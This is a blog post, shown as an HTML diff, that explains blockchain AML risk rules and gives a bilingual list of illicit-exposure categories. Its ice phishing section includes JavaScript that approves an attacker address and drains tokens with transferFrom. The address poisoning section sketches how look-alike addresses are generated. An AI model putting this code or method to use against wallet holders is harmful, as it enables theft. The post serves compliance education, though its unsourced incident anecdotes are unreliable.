@@ -194,7 +194,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -245,6 +245,163 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://zhuang-weiming.github.io/2024/10/21/Risk-rules-of-public-blockchain/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Weiming Zhuang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zhuang's Diary">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/10/21/Risk-rules-of-public-blockchain/" class="post-title-link" itemprop="url">Risk-rules-of-public-blockchain</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-10-21 16:08:00" itemprop="dateCreated datePublished" datetime="2024-10-21T16:08:00+08:00">2024-10-21</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2024-10-22 11:10:04" itemprop="dateModified" datetime="2024-10-22T11:10:04+08:00">2024-10-22</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Behavior-行为模式"><a href="#Behavior-行为模式" class="headerlink" title="Behavior 行为模式"></a>Behavior 行为模式</h2><h3 id="1-peeling-chain-剥皮链"><a href="#1-peeling-chain-剥皮链" class="headerlink" title="1. peeling chain 剥皮链"></a>1. peeling chain 剥皮链</h3><p>A peeling chain is a behavioral pattern where multiple repeated deposits are made at an exchange or service. A peeling chain pattern may suggest an attempt to stay below a certain KYC threshold to avoid detection.<br>剥皮链是指在交易所或服务平台上反复进行多次存款操作。剥皮链模式可能意味着试图保持在某个KYC阈值以下，以避免被检测到。<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/1.png"><br>举例 - 在2022年初，一些犯罪分子利用剥皮链技术在多家加密货币交易所进行小额频繁的存款操作，以保持在KYC合规的最低要求之下，从而避免被交易所标记为高风险账户。这些小额存款随后被转移到多个中间账户，最终汇集到一个主要的钱包地址，用于购买非法商品或进行洗钱活动。</p>
+<h3 id="2-automated-layering-自动分层"><a href="#2-automated-layering-自动分层" class="headerlink" title="2. automated layering 自动分层"></a>2. automated layering 自动分层</h3><p>Automated layering, also called artificial hops, is a behavioral pattern that involves routing funds through multiple intermediate hops without any dilution of funds. An automated layering pattern may suggest an attempt to obfuscate the true source of funds by exploiting the fact that some screening programs will stop tracing at a certain number of hops.<br>自动分层，也称为人工跳跃，通过多次中间跳跃路由资金，而不稀释资金总额。自动分层模式可能表明企图利用某些筛查程序在一定跳跃次数后停止追踪的特点，来掩盖资金的真实来源。<br><img src="/2024/10/21/Risk-rules-of-public-blockchain/2.png"><br>实例 - 2023年，某犯罪团伙利用自动分层技术，将通过诈骗和勒索所得的加密货币资金，在短时间内通过多个区块链地址进行中转，每次转移均未稀释资金总量。整个操作过程中，资金经过超过20次跳跃，旨在逃避追踪和监管机构的监控。这种行为利用了部分筛查程序的限制（即超过一定次数的跳跃后停止追踪）。</p>
+<h3 id="3-mixer-first-funding-首次混币资助"><a href="#3-mixer-first-funding-首次混币资助" class="headerlink" title="3. mixer first funding 首次混币资助"></a>3. mixer first funding 首次混币资助</h3><p>Mixer first funding is a tactic used during high-profile exploits. Bad actors fund their attack addresses using a Mixer or Coin Swap Service to hide the original source of funds. While these services aren’t illegal in themselves, they allow users to obscure fund origins, which can facilitate illicit activities. This behaviour flags when addresses receive their first transaction from a mixer or low-KYC exchange.like Tornado Cash.<br>首次混币资助是在高调攻击事件中使用的策略。恶意行为者通过混币器或币交换服务为其攻击地址提供资金，以隐藏资金的原始来源。尽管这些服务本身不违法，但它们允许用户掩盖资金来源，可能助长非法活动。当地址接收到来自混币器或低KYC交易所的首次交易时，这种行为会被标记。例如，Tornado Cash。<br>在韩国，一起针对某知名区块链项目的攻击中，黑客利用混币器为攻击钱包地址提供初始资金。黑客通过混币服务掩盖了资金来源，然后对该区块链项目的智能合约漏洞进行了攻击，盗取了价值数千万美元的加密货币。</p>
+<h3 id="4-address-poisoner-地址投毒者"><a href="#4-address-poisoner-地址投毒者" class="headerlink" title="4. address poisoner 地址投毒者"></a>4. address poisoner 地址投毒者</h3><p>Address Poisoner identifies addresses that conducted an address poisoning attack. Address poisoning, also known as address spoofing, is a scam where fraudsters create a fake wallet address resembling the user’s or one frequently used by them. Using this fake address, they send small amounts of cryptocurrency or NFTs to the user’s wallet, which ‘poisons’ the transaction history with deceitful transactions. They anticipate that the user, failing to notice the difference due to the address similarity, will unwittingly use the scam address for transactions - resulting in the loss of funds.<br>地址投毒者识别那些进行了地址投毒攻击的地址。地址投毒（也称地址欺骗）是一种骗局，骗子创建一个伪造的、与用户常用地址相似的钱包地址，并向用户的钱包发送少量加密货币或NFT，从而“污染”交易历史，使其充满欺骗性的交易记录。他们预期用户因地址相似而未能发现差异，从而在进行交易时不经意地使用了骗局地址，导致资金损失。<br>2022年底，美国一名诈骗者在某用户频繁使用的加密货币地址基础上，创建了一个仅在最后几位字符上不同的假冒地址。诈骗者利用这一相似地址，向受害者的钱包发送少量加密货币，希望受害者在未来的交易中误用该假冒地址，导致资金转入诈骗者控制的钱包。受害者没有仔细核对地址，误将价值数千美元的加密货币转入诈骗者的钱包。尽管事后发现了问题，但资金已无法追回。<br>1）诈骗者可以通过编写脚本，自动生成大量的地址，然后筛选出与目标地址相似的地址。由于每次生成的地址都是不同的，只要生成足够多的地址，总能找到一个与目标地址在某些位置上相似的地址。这个方法类似于“暴力破解”，需要大量的计算资源，但可以通过批量生成和筛选来实现。2）有些加密货币钱包允许用户使用一些工具（如Vanitygen）来生成“个性化”的地址，即地址的部分字符是可以指定的。这些工具允许用户设定地址的前缀或后缀，然后通过不断尝试生成满足条件的地址。例如，可以通过不断生成和筛选找到一个以特定字符或数字结尾的地址，从而与目标地址形成相似性。</p>
+<h3 id="5-exploiter-攻击者"><a href="#5-exploiter-攻击者" class="headerlink" title="5. exploiter 攻击者"></a>5. exploiter 攻击者</h3><p>Leverage this rule to mitigate interaction with addresses that have participated in a hack or exploit.<br>通过此规则，可以减少与曾参与黑客攻击或漏洞利用的地址之间的互动。</p>
+<h3 id="6-Ice-phishing-冰钓式网络钓鱼"><a href="#6-Ice-phishing-冰钓式网络钓鱼" class="headerlink" title="6. Ice phishing 冰钓式网络钓鱼"></a>6. Ice phishing 冰钓式网络钓鱼</h3><p>Ice phishing occurs when a user unknowingly allows a scammer to control their wallet. The scammer tricks the user into approving a transaction that looks safe, but in reality, the approval is granted to the scammer’s address hidden in transaction data. Once the approval is given, the attacker can take control over their digital assets. Leverage this rule to prevent interactions with addresses that have performed ice phishing attacks.<br>冰钓式网络钓鱼发生在用户在不知情的情况下允许诈骗者控制他们的钱包时。诈骗者诱骗用户批准一项看似安全的交易，但实际上，交易数据中隐藏的批准地址是诈骗者的。一旦批准，攻击者就可以控制用户的数字资产。通过此规则可以防止与执行冰钓式网络钓鱼攻击的地址进行交互。<br>2023年3月，英国某用户在一次空投活动中，批准了一项授权交易，实际上授权的是一个隐藏在交易数据中的恶意地址。该恶意地址由诈骗者控制，一旦获得授权，诈骗者迅速将用户的钱包中的代币转移至自己的钱包。受害者损失了价值超过50万美元的加密货币，而诈骗者利用多个分层账户迅速洗白这笔资金，避免了被追踪。</p>
+<p><strong>原理说明</strong></p>
+<ol>
+<li><strong>诱饵设定</strong>：诈骗者通常会通过某种诱饵，比如伪造的空投、假冒的DApp（去中心化应用）或钓鱼网站，诱导用户进行某项操作。</li>
+<li><strong>授权请求</strong>：当用户点击“领取空投”或进行其他操作时，网站或应用会弹出一个交易请求，让用户授权某个智能合约或地址管理其代币。用户通常会认为这是一个安全的操作，实际上授权的地址是攻击者的恶意地址。</li>
+<li><strong>恶意授权</strong>：用户一旦确认交易，攻击者就获得了代币的控制权限，可以任意转移受害者的资产。</li>
+</ol>
+<p><strong>代码实例</strong><br>以下是一个示例，以ERC20代币为例，展示如何构造一个授权交易，并潜在地进行恶意操作：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用以太坊Web3库构造授权交易</span></span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> Web3(<span class="string">&#x27;https://mainnet.infura.io/v3/YOURINFURAAPIKEY&#x27;</span>);</span><br><span class="line"><span class="comment">// ERC20代币合约地址（示例）</span></span><br><span class="line"><span class="keyword">const</span> tokenContractAddress = <span class="string">&#x27;0xYourTokenContractAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// 恶意地址（诈骗者控制的地址）</span></span><br><span class="line"><span class="keyword">const</span> maliciousAddress = <span class="string">&#x27;0xAttackerAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// 受害者钱包地址</span></span><br><span class="line"><span class="keyword">const</span> victimAddress = <span class="string">&#x27;0xVictimAddress&#x27;</span>;</span><br><span class="line"><span class="comment">// ERC20合约ABI（接口定义，用于与合约进行交互）</span></span><br><span class="line"><span class="keyword">const</span> erc20Abi = [</span><br><span class="line">    <span class="comment">// 省略部分ABI，只保留approve方法</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;constant&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;spender&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;value&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;approve&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ERC20代币合约实例</span></span><br><span class="line"><span class="keyword">const</span> tokenContract = <span class="keyword">new</span> web3.eth.Contract(erc20Abi, tokenContractAddress);</span><br><span class="line"><span class="comment">// 授权操作，实际上授权给了恶意地址</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">approveMaliciousAddress</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> amount = web3.utils.toWei(<span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>); <span class="comment">// 授权数量，比如1000个代币</span></span><br><span class="line">        <span class="comment">// 构造授权交易数据</span></span><br><span class="line">        <span class="keyword">const</span> approveData = tokenContract.methods.approve(maliciousAddress, amount).encodeABI();</span><br><span class="line">        <span class="comment">// 构造交易对象</span></span><br><span class="line">        <span class="keyword">const</span> transactionObject = &#123;</span><br><span class="line">            <span class="keyword">from</span>: victimAddress,</span><br><span class="line">            to: tokenContractAddress,</span><br><span class="line">            data: approveData,</span><br><span class="line">            gas: <span class="number">200000</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 在此处，用户会看到一个请求他们批准授权的弹窗，若用户批准，授权将被执行</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;请在钱包中确认授权交易&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&#x27;授权交易失败:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">approveMaliciousAddress();</span><br></pre></td></tr></table></figure>
+<p><strong>攻击过程</strong><br>一旦授权完成，恶意地址将获得代币转移的权限。诈骗者可以使用transferFrom方法，将受害者的代币转移到自己控制的钱包。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转移代币的代码示例（攻击者执行）</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">transferTokensFromVictim</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> amount = web3.utils.toWei(<span class="string">&#x27;1000&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>); <span class="comment">// 转移数量</span></span><br><span class="line">        <span class="comment">// 调用transferFrom将代币从受害者地址转移到攻击者地址</span></span><br><span class="line">        <span class="keyword">await</span> tokenContract.methods.transferFrom(victimAddress, maliciousAddress, amount).send(&#123; <span class="attr">from</span>: maliciousAddress &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;代币已成功转移到攻击者钱包&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">&#x27;代币转移失败:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>防范措施</strong><br>• <strong>仔细检查授权地址</strong>：用户在确认授权交易时，应该仔细检查授权的地址，确保不是恶意地址。</p>
+<h3 id="7-associated-scammer-address-关联诈骗者地址"><a href="#7-associated-scammer-address-关联诈骗者地址" class="headerlink" title="7. associated scammer address 关联诈骗者地址"></a>7. associated scammer address 关联诈骗者地址</h3><p>Leverage this rule to mitigate interaction with addresses that have received funds from a known scammer.<br>通过此规则，可以减少与曾接收过已知诈骗者资金的地址之间的互动。</p>
+<h3 id="8-scammer-deployed-contract-诈骗者部署的合约"><a href="#8-scammer-deployed-contract-诈骗者部署的合约" class="headerlink" title="8. scammer deployed contract 诈骗者部署的合约"></a>8. scammer deployed contract 诈骗者部署的合约</h3><p>Leverage this rule to mitigate interaction with smart contracts deployed by known scammers. These contracts often promise high returns or false investments but are designed to siphon funds once the victim interacts with them. You can expand this section by discussing how smart contracts are audited (or not) and why code auditing practices could help detect scammer-deployed contracts early.<br>通过此规则，可以减少与已知诈骗者部署的智能合约之间的互动。这些合约通常承诺高回报或虚假投资，但其目的是在受害者与其互动后吸走资金。讨论如何审计智能合约（或不审计）以及为什么代码审计实践可以帮助及早发现诈骗者部署的合约来扩展此部分。</p>
+<h3 id="9-pig-butchering-杀猪盘"><a href="#9-pig-butchering-杀猪盘" class="headerlink" title="9. pig butchering 杀猪盘"></a>9. pig butchering 杀猪盘</h3><p>Pig Butchering is a scam that utilizes deceptive communications to manipulate individuals into making fraudulent investments. This behavior identifies addresses that have received transactions suspected to be from Pig Butchering victims. This is accomplished by analyzing historical transactions made by victims of Pig Butchering.<br>杀猪盘是一种利用欺骗性沟通来操控个人进行虚假投资的骗局。该行为识别接收到疑似来自杀猪盘受害者交易的地址。这是通过分析杀猪盘受害者的历史交易实现的。<br>2023年7月，东南亚一个国际诈骗团伙通过社交平台接触受害者，利用情感交流和投资诱惑逐渐获取受害者的信任，随后引导受害者向所谓的“高收益投资项目”转账，实际上这些资金都进入了诈骗者控制的钱包。多个受害者损失金额高达数百万美元。受害者在察觉被骗后报案，但由于资金早已被分散转移至多个国家的加密货币账户，追查和追回难度极大。</p>
+<h2 id="Exposure"><a href="#Exposure" class="headerlink" title="Exposure"></a>Exposure</h2><p>Detect exposure to labeled entities using various risk triggers 意思是识别与某些特定类别的实体（如企业、个人或组织）之间的潜在风险关联。<br>系统通过多种风险触发器来检测用户或地址与这些标记的实体之间的交互情况。这些实体通常被标记为与特定的高风险活动相关：</p>
+<p><strong>1. Activist Fundraising (政治/社会运动筹款)</strong><br>与政治或社会运动相关的筹款活动，可能涉及高风险或敏感的资金来源，存在被利用进行非法活动的风险。<br>Associated with political or social movement fundraising, potentially involving high-risk or sensitive fund sources, and could be used for illegal activities.</p>
+<p><strong>2. ATM (加密货币自动取款机)</strong><br>加密货币ATM允许用户将加密货币兑换成现金或反向操作，因其匿名性和现金交易特性，可能被用于洗钱活动。<br>Cryptocurrency ATMs allow users to convert crypto into cash or vice versa. Due to their anonymity and cash-based transactions, they can be used for money laundering.</p>
+<p><strong>3. Authentication (身份认证服务)</strong><br>涉及身份认证服务，可能存在身份欺诈和非法账户访问的风险。<br>Involves identity authentication services, which could carry risks related to identity fraud and unauthorized account access.</p>
+<p><strong>4. Bitcoin Faucet (比特币水龙头)</strong><br>提供少量免费比特币的网站，可能被用于隐匿资金来源或洗钱。<br>Websites that distribute small amounts of free Bitcoin, potentially used to obscure the source of funds or launder money.</p>
+<p><strong>5. Bridge (跨链桥服务)</strong><br>跨链桥服务用于在不同区块链之间转移资产，可能增加资金追踪的难度。<br>Cross-chain bridges allow asset transfers between different blockchains, which can complicate fund tracing.</p>
+<p><strong>6. Broker (经纪商/中介服务)</strong><br>未经许可的金融中介服务，可能涉及非法金融活动或欺诈。<br>Unlicensed financial intermediaries, potentially involved in illegal financial operations or fraud.</p>
+<p><strong>7. Charity (慈善机构)</strong><br>某些慈善机构可能被用于洗钱或掩盖非法资金流动。<br>Some charity organizations may be used for money laundering or concealing illegal fund flows.</p>
+<p><strong>8. Child Sexual Abuse Material Vendor (儿童性虐待材料供应商)</strong><br>涉及儿童性虐待材料的交易，是严重的非法活动风险指示。<br>Involves the trade of child sexual abuse material (CSAM), a severe indicator of illegal activity.</p>
+<p><strong>9. Coin Swap Service (币种兑换服务)</strong><br>币种兑换服务用于将一种加密货币兑换为另一种，可能被用于洗钱或隐藏资金来源。<br>Coin swap services exchange one cryptocurrency for another and may be used for money laundering or hiding the source of funds.</p>
+<p><strong>10. Credit Card Data Vendor (信用卡数据供应商)</strong><br>非法出售信用卡数据的服务，常用于网络犯罪和欺诈。<br>Services that illegally sell credit card data, often used in cybercrime and fraud.</p>
+<p><strong>11. Criminal Organization (犯罪组织)</strong><br>与已知犯罪组织相关的实体，这些组织涉及洗钱、勒索等非法活动。<br>Entities associated with known criminal organizations involved in activities such as money laundering, extortion, etc.</p>
+<p><strong>12. Dark Forum (暗网论坛)</strong><br>暗网上的非法讨论平台，常用于信息交易和非法商品交易。<br>Illicit discussion platforms on the darknet, often used for information exchange and the trade of illegal goods.</p>
+<p><strong>13. Dark Market – Centralized (中心化暗网市场)</strong><br>提供非法商品和服务的中心化暗网市场。<br>Centralized darknet markets offering illegal goods and services.</p>
+<p><strong>14. Dark Market – Decentralized (去中心化暗网市场)</strong><br>去中心化的非法商品和服务交易市场，难以追踪和关闭。<br>Decentralized marketplaces for trading illegal goods and services, harder to trace and shut down.</p>
+<p><strong>15. Dark Service (暗网服务)</strong><br>提供匿名代理、伪造文档等非法服务的平台。<br>Platforms providing illegal services such as anonymous proxy, forged documents, etc.</p>
+<p><strong>16. Dark Vendor Shop (暗网供应商店)</strong><br>在暗网市场上设立的供应商店，提供非法商品或服务。<br>Vendor shops on darknet markets providing illegal goods or services.</p>
+<p><strong>17. Extortion (勒索)</strong><br>通过威胁或强制手段获取资金，常见于勒索软件攻击中。<br>Obtaining funds through threats or coercion, commonly seen in ransomware attacks.</p>
+<p><strong>18. FinCEN Primary Money Laundering Concern (FinCEN主要洗钱关注对象)</strong><br>被美国金融犯罪执法网络（FinCEN）认定为主要洗钱对象。<br>Entities identified by the U.S. FinCEN as primary money laundering concerns.</p>
+<p><strong>19. Gambling (赌博)</strong><br>在线赌博服务，可能与资金洗白、欺诈有关。<br>Online gambling services, potentially associated with money laundering or fraud.</p>
+<p><strong>20. Known Criminal (已知犯罪分子)</strong><br>已被确认与犯罪行为有关联的实体，涉及欺诈、盗窃等活动。<br>Entities known to be involved in criminal activities such as fraud, theft, etc.</p>
+<p><strong>21. Malware (恶意软件)</strong><br>涉及恶意软件的交易，这些软件用于窃取资金或敏感信息。<br>Transactions involving malware used to steal funds or sensitive information.</p>
+<p><strong>22. Marijuana Vendor Shop (大麻销售店铺)</strong><br>销售大麻的商店，在一些地区可能非法。<br>Shops selling marijuana, which may be illegal in certain jurisdictions.</p>
+<p><strong>23. Mixer (混币服务)</strong><br>混币服务用于混淆加密货币的资金来源，常用于洗钱。<br>Mixing services used to obscure the source of cryptocurrency, often for money laundering.</p>
+<p><strong>24. OFAC Sanctioned Entity (OFAC制裁实体)</strong><br>受到美国外国资产控制办公室（OFAC）制裁的实体。<br>Entities sanctioned by the U.S. Office of Foreign Assets Control (OFAC).</p>
+<p><strong>25. Phishing (网络钓鱼)</strong><br>通过欺诈手段获取用户敏感信息（如私钥或登录凭证），常见于网络钓鱼攻击。<br>Fraudulently obtaining sensitive user information (e.g., private keys or login credentials), common in phishing attacks.</p>
+<p><strong>26. Ponzi Scheme (庞氏骗局)</strong><br>一种非法的投资骗局，承诺高额回报，但实际上利用新投资者的资金支付旧投资者的收益。<br>An illegal investment scam promising high returns, but actually uses new investors’ funds to pay previous investors.</p>
+<p><strong>27. Privacy Wallet (隐私钱包)</strong><br>注重隐私保护的钱包，可能被用于隐藏交易历史或资金流动。e.g., Wasabi Wallet。<br>Privacy-focused wallets designed to conceal transaction histories or fund flows. e.g., Wasabi Wallet.</p>
+<p><strong>28. Ransomware (勒索软件)</strong><br>勒索软件攻击中使用的地址，受害者需支付赎金解锁被恶意加密的数据。<br>Addresses involved in ransomware attacks, where victims pay ransoms to unlock maliciously encrypted data.</p>
+<p><strong>29. Scam (诈骗)</strong><br>涉及诈骗活动的实体或地址，这些地址可能用于网络钓鱼或其他形式的欺诈。<br>Entities or addresses involved in fraudulent activities, often used in phishing or other types of fraud.</p>
+<p><strong>30. Shielded (隐私交易)</strong><br>通过隐私保护技术（如零知识证明）隐藏交易信息的工具。<br>Tools that use privacy-enhancing techniques (like zero-knowledge proofs) to hide transaction details.</p>
+<p><strong>31. Thief (盗窃)</strong><br>涉及盗窃加密货币的地址，通常通过未经授权的访问或攻击行为。<br>Addresses involved in cryptocurrency theft, typically via unauthorized access or hacking.</p>
+<p><strong>32. Terrorist Organization (恐怖组织)</strong><br>涉及恐怖组织的资金流动。<br>Transactions associated with terrorist organizations.</p>
+<p><strong>33. Human Trafficking (人口贩运)</strong><br>与人口贩运相关的资金流动。<br>Transactions related to human trafficking activities.</p>
+<p><strong>34. Weapon Sales (武器销售)</strong><br>非法武器销售相关的资金流动。<br>Transactions involving the illegal sale of weapons.</p>
+<p><strong>35. Drug Trafficking (毒品贩运)</strong><br>与非法毒品交易相关的资金流动。<br>Transactions related to the illegal drug trade.</p>
+<p><strong>36. Sanctioned Countries (受制裁国家)</strong><br>与受国际制裁国家的交易，可能违反国际法。<br>Transactions with entities from sanctioned countries, potentially violating international law.</p>
+<p><strong>37. Shell Companies (空壳公司)</strong><br>被用于洗钱或隐藏非法资金来源的空壳公司。<br>Shell companies used for money laundering or hiding illegal fund sources.</p>
+<p><strong>38. High-Risk Jurisdictions (高风险司法管辖区)</strong><br>与高腐败或监管薄弱的国家或地区的交易，可能增加洗钱风险。<br>Transactions with countries or regions known for weak regulations or high corruption, increasing money laundering risks.</p>
+<p><strong>39. Fraudulent ICO (欺诈性ICO)</strong><br>假冒的初始代币发行，承诺高额回报但无实际项目支持。<br>Fake Initial Coin Offerings (ICOs) that promise high returns but have no real project backing.</p>
+<p><strong>40. Illegal Content (非法内容)</strong><br>传播或交易非法内容（如盗版、暴力、仇恨言论），这些行为通常违反法律。<br>The distribution or trade of illegal content (e.g., pirated material, violence, hate speech), which typically violates the law.</p>
+<p><strong>41. Illicit Marketplace (非法市场)</strong><br>从事非法商品或服务交易的市场，这些市场往往涉及洗钱、毒品或武器交易。<br>Marketplaces that deal in illegal goods or services, often involving money laundering, drug trade, or weapons transactions.</p>
+<p><strong>42. Money Mule (资金骡子)</strong><br>通过第三方账户转移非法资金的活动，这些账户通常不知情或自愿参与。<br>Involves the transfer of illicit funds through third-party accounts, where the account holders may be unaware or willingly participate.</p>
+<p><strong>43. Ponzi-like Scheme (类庞氏骗局)</strong><br>与庞氏骗局类似的投资骗局，承诺高额回报但实际上以新的投资者资金支付旧投资者的收益。<br>A fraudulent investment operation similar to a Ponzi scheme, promising high returns while using new investors’ money to pay earlier investors.</p>
+<p><strong>44. Privacy Coin (隐私币)</strong><br>设计用于隐藏交易细节的加密货币，虽然保护用户隐私，但也可能被用于非法活动。<br>Cryptocurrencies designed to conceal transaction details, while enhancing user privacy, may also be used for illicit activities.</p>
+<p><strong>45. Ransomware Payment (勒索软件支付)</strong><br>向勒索软件攻击者支付赎金的交易，用以解锁被恶意加密的数据。<br>Transactions made to ransomware attackers to unlock maliciously encrypted data.</p>
+<p><strong>46. Sanctioned Individual (受制裁个人)</strong><br>与受国际或政府制裁的个人进行交易，可能违反制裁法律。<br>Transactions with individuals under international or government sanctions, potentially violating sanction laws.</p>
+<p><strong>47. Suspicious Transaction (可疑交易)</strong><br>异常或可疑的交易行为，可能与洗钱、欺诈或其他非法活动相关。<br>Transactions that appear abnormal or suspicious, potentially linked to money laundering, fraud, or other illicit activities.</p>
+<p><strong>48. Terrorist Financing (恐怖主义融资)</strong><br>为恐怖组织提供资金的行为，通常通过加密货币隐秘进行。<br>The act of providing financial support to terrorist organizations, often facilitated covertly through cryptocurrency.</p>
+<p><strong>49. Unlicensed Money Service Business (无牌照货币服务业务)</strong><br>未经许可的货币兑换或转账服务，可能涉及洗钱或非法金融活动。<br>Unlicensed currency exchange or transfer services, potentially involved in money laundering or illegal financial activities.</p>
+<p><strong>50. Whale Transaction (巨鲸交易)</strong><br>涉及大量加密货币交易，可能引起市场波动或被用于非法资金转移。<br>Transactions involving large amounts of cryptocurrency, potentially affecting market stability or used for illicit fund transfers.</p>
+<p><strong>51. Front-Running (抢跑交易)</strong><br>涉及利用未公开的市场信息，在合法交易被确认之前抢先执行交易，导致市场操纵或不公平的交易环境。<br>Front-running involves using non-public market information to execute trades before legitimate trades are confirmed, leading to market manipulation or unfair practices.</p>
+<p><strong>52. Pump-and-Dump (拉高出货)</strong><br>一种市场操纵手段，操纵者人为抬高加密货币的价格，吸引散户投资者购买，随后抛售手中的大量持仓。<br>A form of market manipulation where perpetrators artificially inflate the price of a cryptocurrency to attract retail investors, then sell off their large holdings.</p>
+<p><strong>53. Wash Trading (刷单交易)</strong><br>交易者通过自己在不同账户间反复买卖相同资产，制造虚假交易量，操纵市场价格。<br>Traders repeatedly buy and sell the same asset between their own accounts, creating fake trading volume to manipulate market prices.</p>
+<p><strong>54. Regulatory Arbitrage (监管套利)</strong><br>利用不同司法管辖区的监管差异，通过选择监管较宽松的地区进行交易，规避合规要求。<br>Taking advantage of regulatory differences across jurisdictions by trading in regions with looser regulations to avoid compliance requirements.</p>
+<p>=============== the risks below are not list in the Elliptic and TRMLAB ===============<br>================= 以下风险没有包含在 Elliptic and TRMLAB 的范围内 =================</p>
+<p><strong>55. Fake News Manipulation (假新闻操纵)</strong><br>散布虚假消息，影响市场情绪和资产价格，从中获利或导致市场动荡。<br>Spreading false information to manipulate market sentiment and asset prices, either for profit or to destabilize the market.</p>
